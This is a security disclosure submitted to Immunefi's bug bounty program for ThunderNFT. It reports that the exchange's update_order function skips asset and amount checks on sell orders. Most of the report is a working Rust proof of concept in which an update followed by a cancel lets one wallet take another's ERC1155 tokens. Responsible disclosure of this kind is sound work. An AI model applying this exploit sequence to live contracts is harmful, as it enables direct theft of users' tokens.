# IOP \_ ThunderNFT 34934 - \[Smart Contract - Critical] thunder\_exchangeupdate\_order can be abused to s

Submitted on Sun Sep 01 2024 15:04:49 GMT-0400 (Atlantic Standard Time) by @jasonxiale for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34934

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/thunder\\_exchange>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

According to [discord chat history](https://discord.com/channels/787092485969150012/1271498128981495950/1273191123048988796), ERC1155 tokens are also in scope.

In current implementation, there is an issue that when ERC1155 token is used, malicious can steal erc1155 token that has the same assetId by abusing `thunder_exchange.update_order`

## Vulnerability Details

In [thunder\_exchange. place\_order](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L83-L109), while the `order.side` is `Side::Sell`, the function will check if the tx's assetId matches order's tokenId, and also check if tx's token amount equals `order_input.amount` in [thunder\_exchange#L96-L101](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L96-L101)

But in [thunder\_exchange.update\_order](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L112-L132), **while `order.side` is `Side::Sell`, the function doesn't check the assetId and amount mathces with the order in** [**thunder\_exchange#L124**](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L124)

```rust
112     #[storage(read), payable]
113     fn update_order(order_input: MakerOrderInput) {
114         _validate_maker_order_input(order_input);
115 
116         let strategy = abi(ExecutionStrategy, order_input.strategy.bits());
117         let order = MakerOrder::new(order_input);
118         match order.side {
119             Side::Buy => {
120                 // Checks if user has enough bid balance
121                 let pool_balance = _get_pool_balance(order.maker, order.payment_asset);
122                 require(order.price <= pool_balance, ThunderExchangeErrors::AmountHigherThanPoolBalance);
123             },
124             Side::Sell => {}, <<<--- The function does nothing here
125         }
126 
127         strategy.update_order(order);
128 
129         log(OrderUpdated {
130             order
131         });
132     }
```

## Impact Details

Because `thunder_exchange.update_order` does nothing when the `order.side` is `Side::Sell` in [thunder\_exchange#L124](https://github.com/ThunderFuel/smart-contracts/blob/260c9859e2cd28c188e8f6283469bcf57c9347de/contracts-v1/thunder_exchange/src/main.sw#L124)

1. malicious user can abusing this issue to steal ERC1155 token.
2. when a honest user wants to reduce `order_input.amount`, the remaining ERC1155 token won't be returned to the user.

## References

Add any relevant links to documentation or code

## Proof of concept

## Proof of Concept

1. To mock the ERC1155, I make some changes in `erc721` folder, and re-use erc721 as ERC1155

```diff
diff --git a/contracts-v1/erc721/src/main.sw b/contracts-v1/erc721/src/main.sw
index 3441054..92f56c7 100644
--- a/contracts-v1/erc721/src/main.sw
+++ b/contracts-v1/erc721/src/main.sw
@@ -263,15 +263,15 @@ impl SRC3 for Contract {
 
         // Checks to ensure this is a valid mint.
         let asset = AssetId::new(ContractId::this(), sub_id);
-        require(amount == 1, MintError::CannotMintMoreThanOneNFTWithSubId);
-        require(
-            storage
-                .total_supply
-                .get(asset)
-                .try_read()
-                .is_none(),
-            MintError::NFTAlreadyMinted,
-        );
+        //require(amount == 1, MintError::CannotMintMoreThanOneNFTWithSubId);
+        //require(
+        //    storage
+        //        .total_supply
+        //        .get(asset)
+        //        .try_read()
+        //        .is_none(),
+        //    MintError::NFTAlreadyMinted,
+        //);
         require(
             storage
                 .total_assets
```

2. Then generate a Rust test template under `thunder_exchange` folder, and puts the following code in `thunder_exchange/tests/harness.rs` and `run cargo test -- --nocapture`

```bash
cargo test  -- --nocapture

running 1 test
test can_steal_erc1155_by_update_sell ... at start, mint wallet_1 and wallet2 10 tokens each
wallet_1 balance: 10
waleet_2 balance: 10
after wallet_1 and wallet2 calls place_order to fill sell order with 5 tokens each
wallet_1 balance: 5
waleet_2 balance: 5
after malicious  wallet_1 calls update_order and cancel_order, he get more erc1155 token than expected
wallet_1 balance: 15
waleet_2 balance: 5
ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 1.85s
```

As the test case shows, by abusing `thunder_exchange.update_order` and `thunder_exchange.cancel_order`, the malicious user(wallet\_1) get more erc1155 token than expected.

```rust
use fuels::{prelude::*, types::ContractId};

use std::str::FromStr;
 
use fuels::types::{Address, AssetId, Bits256, Bytes32, Identity};
use sha2::{Digest, Sha256};
use fuels::{programs::calls::Execution,};

// Load abi from json
abigen!(
    Contract(
        name = "ThunderExchange",
        abi = "out/debug/thunder_exchange-abi.json"
    ),
    Contract(
        name = "NFT",
        abi = "out/debug/NFT-contract-abi.json"
    ),
    Contract(
        name = "ExecutionManager",
        abi = "out/debug/execution_manager-abi.json"
    ),
    Contract(
        name = "ExecutionStrategy",
        abi = "out/debug/strategy_fixed_price_sale-abi.json"
    ),
    Contract(
        name = "AssetManager",
        abi = "out/debug/asset_manager-abi.json"
    ),
    Contract(
        name = "Pool",
        abi = "out/debug/pool-abi.json"
    ),
    Contract(
        name = "RoyaltyManager",
        abi = "out/debug/royalty_manager-abi.json"
    ));


#[tokio::test]
async fn can_steal_erc1155_by_update_sell()  -> Result<()> {
    let mut wallets = launch_custom_provider_and_get_wallets(
        WalletsConfig::new(
            Some(5),
            Some(1),
            Some(1_000_000_000), /* Amount per coin */
        ),
        None,
        None,
    )
    .await
    .unwrap();
    let wallet = wallets.pop().unwrap();
    let wallet_1 = wallets.pop().unwrap();
    let wallet_2 = wallets.pop().unwrap();
    let wallet_3 = wallets.pop().unwrap();
    let wallet_4 = wallets.pop().unwrap();

    let thunder_exchange_id = Contract::load_from(
        "./out/debug/thunder_exchange.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let nft_id = Contract::load_from(
        "./out/debug/NFT-contract.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let execution_manager_id = Contract::load_from(
        "./out/debug/execution_manager.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let strategy_fixed_price_sale_id = Contract::load_from(
        "./out/debug/strategy_fixed_price_sale.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let asset_manager_id = Contract::load_from(
        "./out/debug/asset_manager.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let pool_id = Contract::load_from(
        "./out/debug/pool.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();

    let royalty_manager_id = Contract::load_from(
        "./out/debug/royalty_manager.bin",
        LoadConfiguration::default(),
    )
    .unwrap()
    .deploy(&wallet, TxPolicies::default())
    .await
    .unwrap();


    // setup thunder_exchange
    let thunder_exchange_instance = ThunderExchange::new(thunder_exchange_id.clone(), wallet.clone());
    let thunder_exchange_methods = thunder_exchange_instance.clone().methods();
    thunder_exchange_methods.initialize().with_tx_policies(TxPolicies::default()).call().await?;

    let strategy_fixed_price_sale_instance = ExecutionStrategy::new(strategy_fixed_price_sale_id.clone(), wallet.clone());
    let strategy_fixed_price_sale_methods = strategy_fixed_price_sale_instance.clone().methods();
    strategy_fixed_price_sale_methods.initialize(thunder_exchange_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;

    let execution_manager_instance = ExecutionManager::new(execution_manager_id.clone(), wallet.clone());
    let execution_manager_methods = execution_manager_instance.clone().methods();
    execution_manager_methods.initialize().with_tx_policies(TxPolicies::default()).call().await?;
    execution_manager_methods.add_strategy(strategy_fixed_price_sale_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;

    let asset_manager_instance = AssetManager::new(asset_manager_id.clone(), wallet.clone());
    let asset_manager_methods = asset_manager_instance.clone().methods();
    asset_manager_methods.initialize().with_tx_policies(TxPolicies::default()).call().await?;
    asset_manager_methods.add_asset(AssetId::zeroed()).with_tx_policies(TxPolicies::default()).call().await?;


    let pool_instance = Pool::new(pool_id.clone(), wallet.clone());
    let pool_methods = pool_instance.clone().methods();
    pool_methods.initialize(thunder_exchange_id.clone(), asset_manager_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;

    let royalty_manager_instance = RoyaltyManager::new(royalty_manager_id.clone(), wallet.clone());
    let royalty_manager_methods = royalty_manager_instance.clone().methods();
    royalty_manager_methods.initialize().with_tx_policies(TxPolicies::default()).call().await?;

    thunder_exchange_methods.set_pool(pool_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;
    thunder_exchange_methods.set_execution_manager(execution_manager_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;
    thunder_exchange_methods.set_royalty_manager(royalty_manager_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;
    thunder_exchange_methods.set_asset_manager(asset_manager_id.clone()).with_tx_policies(TxPolicies::default()).call().await?;

    let nft_instance = NFT::new(nft_id.clone(), wallet_1.clone());

    let nft_contract_id: ContractId = nft_id.into();
    let sub_id_1 = Bytes32::from([1u8; 32]);
    let sub_id_2 = Bytes32::from([2u8; 32]);
    let sub_id_3 = Bytes32::from([3u8; 32]);
    let asset_id_1 = get_asset_id(sub_id_1, nft_contract_id);
    let asset_id_2 = get_asset_id(sub_id_2, nft_contract_id);
    let asset_id_3 = get_asset_id(sub_id_3, nft_contract_id);
    
    let identity   = Identity::Address(Address::from(wallet.address()));
    let identity_1 = Identity::Address(Address::from(wallet_1.address()));
    let identity_2 = Identity::Address(Address::from(wallet_2.address()));
 
    nft_instance.methods().constructor(identity).call().await?;
    nft_instance.clone().with_account(wallet.clone()).methods().mint(identity_1, Bits256(*sub_id_1), 10).with_variable_output_policy(VariableOutputPolicy::Exactly(1)).call().await?;
    nft_instance.clone().with_account(wallet.clone()).methods().mint(identity_2, Bits256(*sub_id_1), 10).with_variable_output_policy(VariableOutputPolicy::Exactly(1)).call().await?;

    println!("at start, mint wallet_1 and wallet2 10 tokens each");
    println!("wallet_1 balance: {}", get_wallet_balance(&wallet_1, &asset_id_1).await);
    println!("waleet_2 balance: {}", get_wallet_balance(&wallet_2, &asset_id_1).await);
    let extra_param = ExtraParams {
        extra_address_param: Address::zeroed(),
        extra_contract_param: ContractId::zeroed(),
        extra_u_64_param: 0,
    };
    let sell_order = MakerOrderInput {
        side: Side::Sell,
        maker: wallet_1.address().into(),
        collection: nft_contract_id,
        token_id: Bits256(*sub_id_1),
        price: 10,
        amount: 5,
        nonce: 1,
        strategy: strategy_fixed_price_sale_id.clone().into(),
        payment_asset: AssetId::zeroed(),
        expiration_range: 2000,
        extra_params: extra_param.clone(),
    };
    
    let bech32_addr = Bech32Address::new(thunder_exchange_id.hrp(), thunder_exchange_id.hash());
    let call_params = CallParameters::default()
        .with_amount(5)
        .with_asset_id(asset_id_1);

    let response = thunder_exchange_instance.clone()
        .with_account(wallet_1.clone())
        .methods()
        .place_order(sell_order)
        .with_contract_ids(&[strategy_fixed_price_sale_id.clone(), execution_manager_id.clone(), thunder_exchange_id.clone(), nft_contract_id.clone().into(), asset_manager_id.clone(), pool_id.into(), royalty_manager_id.into()])
        .call_params(call_params)
        .unwrap()
        .call()
        .await?;
    let logs = response.decode_logs();
    //println!("logs: {:?}", logs);
    
    let sell_order = MakerOrderInput {
        side: Side::Sell,
        maker: wallet_2.address().into(),
        collection: nft_contract_id,
        token_id: Bits256(*sub_id_1),
        price: 10,
        amount: 5,
        nonce: 1,
        strategy: strategy_fixed_price_sale_id.clone().into(),
        payment_asset: AssetId::zeroed(),
        expiration_range: 2000,
        extra_params: extra_param.clone(),
    };
    
    let bech32_addr = Bech32Address::new(thunder_exchange_id.hrp(), thunder_exchange_id.hash());
    let call_params = CallParameters::default()
        .with_amount(5)
        .with_asset_id(asset_id_1);

    thunder_exchange_instance.clone()
        .with_account(wallet_2.clone())
        .methods()
        .place_order(sell_order)
        .with_contracts(&[&strategy_fixed_price_sale_instance, &execution_manager_instance, &thunder_exchange_instance, &nft_instance, &asset_manager_instance, &pool_instance, &royalty_manager_instance])
        .call_params(call_params)
        .unwrap()
        .call()
        .await?;


    println!("after wallet_1 and wallet2 calls place_order to fill sell order with 5 tokens each");
    println!("wallet_1 balance: {}", get_wallet_balance(&wallet_1, &asset_id_1).await);
    println!("waleet_2 balance: {}", get_wallet_balance(&wallet_2, &asset_id_1).await);

    let sell_order = MakerOrderInput {
        side: Side::Sell,
        maker: wallet_1.address().into(),
        collection: nft_contract_id,
        token_id: Bits256(*sub_id_1),
        price: 10,
        amount: 10,
        nonce: 1,
        strategy: strategy_fixed_price_sale_id.clone().into(),
        payment_asset: AssetId::zeroed(),
        expiration_range: 2000,
        extra_params: extra_param.clone(),
    };
    
    thunder_exchange_instance.clone()
        .with_account(wallet_1.clone())
        .methods()
        .update_order(sell_order)
        .with_contracts(&[&strategy_fixed_price_sale_instance, &execution_manager_instance, &thunder_exchange_instance, &nft_instance, &asset_manager_instance, &pool_instance, &royalty_manager_instance])
        .call()
        .await?;

    //println!("get_maker_order_of_user: {:?}", strategy_fixed_price_sale_methods.get_maker_order_of_user(wallet_1.address(), 1, Side::Sell).with_tx_policies(TxPolicies::default()).call().await?.value);

    thunder_exchange_instance.clone()
        .with_account(wallet_1.clone())
        .methods()
        .cancel_order(strategy_fixed_price_sale_id, 1, Side::Sell)
        .with_variable_output_policy(VariableOutputPolicy::Exactly(1))
        .with_contracts(&[&strategy_fixed_price_sale_instance, &execution_manager_instance, &thunder_exchange_instance, &nft_instance, &asset_manager_instance, &pool_instance, &royalty_manager_instance])
        .call()
        .await?;

    println!("after malicious  wallet_1 calls update_order and cancel_order, he get more erc1155 token than expected");
    println!("wallet_1 balance: {}", get_wallet_balance(&wallet_1, &asset_id_1).await);
    println!("waleet_2 balance: {}", get_wallet_balance(&wallet_2, &asset_id_1).await);

    Ok(())
}

pub(crate) fn get_asset_id(sub_id: Bytes32, contract: ContractId) -> AssetId {
    let mut hasher = Sha256::new();
    hasher.update(*contract);
    hasher.update(*sub_id);
    AssetId::new(*Bytes32::from(<[u8; 32]>::from(hasher.finalize())))
}
pub(crate) async fn get_wallet_balance(wallet: &WalletUnlocked, asset: &AssetId) -> u64 {
    wallet.get_asset_balance(asset).await.unwrap()
}
```
